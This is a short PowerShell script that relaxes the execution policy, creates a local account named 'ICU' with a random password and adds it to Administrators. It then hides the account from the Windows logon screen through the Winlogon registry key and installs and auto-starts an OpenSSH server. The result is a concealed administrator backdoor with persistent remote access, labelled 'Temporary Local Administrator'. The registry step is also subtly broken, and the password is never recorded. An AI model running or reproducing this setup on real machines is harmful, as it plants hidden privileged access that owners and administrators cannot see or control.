# Check the current execution policy
$CurrentPolicy = Get-ExecutionPolicy

# If the execution policy is Restricted, change it to RemoteSigned
if ($CurrentPolicy -eq "Restricted") {
    Set-ExecutionPolicy RemoteSigned -Scope Process -Force
}

# Generate a random password
function RandomPasswordGenerator {
    return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
}

$Username = "ICU"
$Password = RandomPasswordGenerator  # Corrected variable name

# Remove the local user if it exists
if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
    Remove-LocalUser -Name $Username
}

# Create a new local user with administrator privileges
New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName $Username -Description "Temporary Local Administrator"

# Add the new user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Hide the user from the Windows logon screen
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force

# Install the OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the sshd service
Start-Service sshd

# Set the sshd service to start automatically
Set-Service -Name sshd -StartupType "Automatic"
